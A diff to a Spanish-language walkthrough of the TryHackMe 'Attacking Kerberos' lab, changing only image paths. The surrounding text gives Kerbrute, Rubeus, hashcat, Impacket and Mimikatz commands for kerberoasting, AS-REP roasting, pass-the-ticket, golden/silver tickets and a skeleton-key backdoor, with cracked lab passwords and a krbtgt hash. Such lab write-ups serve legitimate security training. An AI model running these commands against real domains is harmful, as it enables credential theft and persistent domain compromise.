@@ -1,8 +1,8 @@
 # Attacking Kerberos
 
-![image.png](image.png)
+![image.png](./imagenes/AttackingKerberos/image.png)
 
-Maquinas que vamos a utilizar Kali Linux y [https://tryhackme.com/room/attackingkerberos](https://tryhackme.com/room/attackingkerberos)
+Maquinas que vamos a utilizar Kali Linux y https://tryhackme.com/room/attackingkerberos
 
 Mi IP: `10.21.203.172`
 
@@ -10,11 +10,11 @@ Mi IP: `10.21.203.172`
 ifconfig
 ```
 
-![image.png](image%201.png)
+![image.png](./imagenes/AttackingKerberos/image%201.png)
 
 IP maquina victima: `10.10.237.124`
 
-![image.png](image%202.png)
+![image.png](./imagenes/AttackingKerberos/image%202.png)
 
 ---
 
@@ -24,7 +24,7 @@ IP maquina victima: `10.10.237.124`
     sudo nmap -p- -sS -sV -sC --open -min-rate 5000 -n -vvv -Pn 10.10.237.124
     ```
     
-    ![image.png](image%203.png)
+    ![image.png](./imagenes/AttackingKerberos/image%203.png)
     
     - Servicios detectados
         
@@ -59,7 +59,7 @@ IP maquina victima: `10.10.237.124`
     
     `10.10.145.20  CONTROLLER.local  CONTROLLER-1`
     
-    ![image.png](image%204.png)
+    ![image.png](./imagenes/AttackingKerberos/image%204.png)
     
     <aside>
     💡
@@ -88,7 +88,7 @@ La **enumeración con Kerbrute** es una técnica que se emplea para identifica
      kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
     ```
     
-    ![image.png](image%205.png)
+    ![image.png](./imagenes/AttackingKerberos/image%205.png)
     
     - La opción **`userenum`** indica que se va a hacer **enumeración de usuarios válidos** en el dominio, no fuerza bruta de contraseñas.
     - **`-dc CONTROLLER.local`** especifica el controlador de dominio (Domain Controller) al que se envían las peticiones.
@@ -132,10 +132,10 @@ La **enumeración con Kerbrute** es una técnica que se emplea para identifica
 - Me conecto por SSH con las credenciales que nos han dado.
     
     ```bash
-    ssh [Administrator@](mailto:Administrator@10.10.145.20)10.10.237.124
+    ssh [Administrator@](./imagenes/AttackingKerberos/mailto:Administrator@10.10.145.20)10.10.237.124
     ```
     
-    ![image.png](image%206.png)
+    ![image.png](./imagenes/AttackingKerberos/image%206.png)
     
     ### **Harvesting Tickets**
     
@@ -149,7 +149,7 @@ La **enumeración con Kerbrute** es una técnica que se emplea para identifica
     
     `.\Rubeus.exe harvest /interval:30`
     
-    ![image.png](image%207.png)
+    ![image.png](./imagenes/AttackingKerberos/image%207.png)
     
     Lo paramos cuando queramos pulsando `CTRL+C`
     
@@ -157,7 +157,7 @@ La **enumeración con Kerbrute** es una técnica que se emplea para identifica
         
         `.\Rubeus.exe triage`
         
-        ![image.png](image%208.png)
+        ![image.png](./imagenes/AttackingKerberos/image%208.png)
         
         - **User** (a quién pertenece)
         - **Service** (para qué servicio)
@@ -168,7 +168,7 @@ La **enumeración con Kerbrute** es una técnica que se emplea para identifica
         
         `.\Rubeus.exe dump`
         
-        ![image.png](image%209.png)
+        ![image.png](./imagenes/AttackingKerberos/image%209.png)
         
 
 - Podemos guardarlos metiendo la salida de dump a un archivo
@@ -184,7 +184,7 @@ Este ataque prueba **una contraseña contra muchos usuarios** (en lugar de mucha
 
 `.\Rubeus.exe brute /password:Password1 /noticket` 
 
-![image.png](image%2010.png)
+![image.png](./imagenes/AttackingKerberos/image%2010.png)
 
 El usuario **`Machine1`** tiene la contraseña **`Password1`**
 
@@ -213,11 +213,11 @@ Kerberoasting permite a un usuario solicitar un ****Tickets de servicio para cua
     
     `cd Downloads`
     
-    ![image.png](image%2011.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2011.png)
     
     `Rubeus.exe kerberoast`
     
-    ![image.png](image%2012.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2012.png)
     
     Este ataque es muy efectivo porque no genera bloqueos de cuentas y puede aprovechar contraseñas débiles en servicios antiguos o mal gestionados.
     
@@ -227,7 +227,7 @@ Kerberoasting permite a un usuario solicitar un ****Tickets de servicio para cua
     nano hash.txt 
     ```
     
-    ![image.png](image%2013.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2013.png)
     
 
 Puede ser que al copiar los hash los copie en varias líneas.  Formateamos para que nos quede cada hash en una linea.
@@ -239,7 +239,7 @@ Puede ser que al copiar los hash los copie en varias líneas.  Formateamos para 
     hashcat -m 13100 -a 0 hash_formateado.txt Pass.txt
     ```
     
-    ![image.png](image%2014.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2014.png)
     
     HTTPService: `Summer2020`
     
@@ -254,7 +254,7 @@ Puede ser que al copiar los hash los copie en varias líneas.  Formateamos para 
     
     `dir`
     
-    ![image.png](image%2015.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2015.png)
     
 
 - Usamos GetUserSPNs.py para  volcará el hash Kerberos para todas las cuentas kerberoastables que pueda encontrar en el dominio. Pero en esta ocasión de forma remota.
@@ -263,7 +263,7 @@ Puede ser que al copiar los hash los copie en varias líneas.  Formateamos para 
     sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.237.124 -request
     ```
     
-    ![image.png](image%2016.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2016.png)
     
 
 - El procedimiento para descifrar estos hash seria el mismo que vimos anteriormente.
@@ -300,13 +300,13 @@ AS-REP Roasting vuelca los hashes krbasrep5 de las cuentas de usuario que tienen
     
     `Rubeus.exe asreproast`
     
-    ![image.png](image%2017.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2017.png)
     
     Ya tenemos los hash. Y como vemos son de oros usuarios que antes no nos había mostrado.
     
 - Vamos a intentar romper estos hash. Los copiamos a un archivo txt pero insertando `23$` después de `$krb5asrep$` quedando así: `$krb5asrep$23$Admin`. Formateamos para que nos quede cada hash en una linea.
     
-    ![image.png](image%2018.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2018.png)
     
 
 - Desciframos los hahs usando el **modo 18200** que es el que utiliza Rubeus AS-REP Roasting
@@ -315,7 +315,7 @@ AS-REP Roasting vuelca los hashes krbasrep5 de las cuentas de usuario que tienen
     hashcat -m 18200 hash2.txt Pass.txt
     ```
     
-    ![image.png](image%2019.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2019.png)
     
     $User: `Password3`
     
@@ -363,26 +363,26 @@ Mimikatz es una herramienta de post-explotación que se usa más comúnmente par
     
     `mimikatz.exe`
     
-    ![image.png](image%2020.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2020.png)
     
 - Miramos que los privilegios que tenemos . Tiene que contestar `Privilege '20' OK`
     
     `privilege::debug`
     
-    ![image.png](image%2021.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2021.png)
     
 - Vamos a exportar todos los ticket en formato **.kirbi** al directorio donde nos encontremos
     
     `sekurlsa::tickets /export`
     
-    ![image.png](image%2022.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2022.png)
     
-    ![image.png](image%2023.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2023.png)
     
 
 - Para este ejercicio buscamos el ticket de administrador de krbtgt. Quizas debamos entrar u salir de mimikatz saldremos escribiendo `exit`.
     
-    ![image.png](image%2024.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2024.png)
     
     `[0;3e69b]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`
     
@@ -391,7 +391,7 @@ Mimikatz es una herramienta de post-explotación que se usa más comúnmente par
     
     `kerberos::ptt [0;3e69b]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi`
     
-    ![image.png](image%2025.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2025.png)
     
     `exit`
     
@@ -399,13 +399,13 @@ Mimikatz es una herramienta de post-explotación que se usa más comúnmente par
     
     `klist`
     
-    ![image.png](image%2026.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2026.png)
     
     Ya tenemos los mismos derechos del ticket que estamos suplantando podemos comprobarlo de listando los recursos compartidos del administrador
     
     `dir \\10.10.237.124\admin$`
     
-    ![image.png](image%2027.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2027.png)
     
 
 ### **Pass the Ticket** mitigación
@@ -420,7 +420,7 @@ Hablemos del equipo azul y de cómo mitigar este tipo de ataques.
 
 Un boleto plateado a veces se puede usar mejor en compromisos en lugar de un boleto dorado porque es un poco más discreto. Si el sigilo y pasar desapercibido importan, entonces un boleto plateado es probablemente una mejor opción que un boleto dorado, sin embargo, el enfoque para crear uno es exactamente el mismo. La diferencia clave entre los dos vales es que un billete plateado se limita al servicio al que se dirige, mientras que un billete dorado tiene acceso a cualquier servicio Kerberos.
 
-![image.png](image%2028.png)
+![image.png](./imagenes/AttackingKerberos/image%2028.png)
 
 - Nos movemos al directorio **Downloads**
     
@@ -430,30 +430,30 @@ Un boleto plateado a veces se puede usar mejor en compromisos en lugar de un bol
     
     `mimikatz.exe`
     
-    ![image.png](image%2029.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2029.png)
     
 
 - Miramos que los privilegios que tenemos . Tiene que contestar `Privilege '20' OK`
     
     `privilege::debug`
     
-    ![image.png](image%2030.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2030.png)
     
 
 - Volcamos el hash, así como el identificador de seguridad necesario para crear un Golden Ticket. Para crear un ticket plateado, se debe cambiar /name: para volcar el hash de una cuenta de administrador de dominio o una cuenta de servicio como la cuenta SQLService.
     
     `lsadump::lsa /inject /name:krbtgt`
     
-    ![image.png](image%2031.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2031.png)
     
-    ![image.png](image%2032.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2032.png)
     
 
 - Creamos un boleto dorado / plateado
     
     `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /rc4:72cd714611b64cd4d5550cd2759db3f6 /id:500`
     
-    ![image.png](image%2033.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2033.png)
     
     Si es un billete dorado se utiliza un id: 500 . Si es plateado un id: 1103
     
@@ -461,7 +461,7 @@ Un boleto plateado a veces se puede usar mejor en compromisos en lugar de un bol
     
     `misc::cmd` 
     
-    ![image.png](image%2034.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2034.png)
     
 
 - Responda las siguientes preguntas
@@ -497,13 +497,13 @@ El hash predeterminado para una clave maestra mimikatz es *60BA4FCADC466C7A033C
     
     `mimikatz.exe`
     
-    ![image.png](image%2029.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2029.png)
     
 
 - Miramos que los privilegios que tenemos . Tiene que contestar Privilege '20' OK
 `privilege::debug`
     
-    ![image.png](image%2030.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2030.png)
     
 
 ### **Instalación de la llave maestra con mimikatz**
@@ -512,7 +512,7 @@ El hash predeterminado para una clave maestra mimikatz es *60BA4FCADC466C7A033C
     
     `misc::skeleton`
     
-    ![image.png](image%2035.png)
+    ![image.png](./imagenes/AttackingKerberos/image%2035.png)
     
     Ya estaría la llave maestra . la contraseña seria : `mimikatz`
     
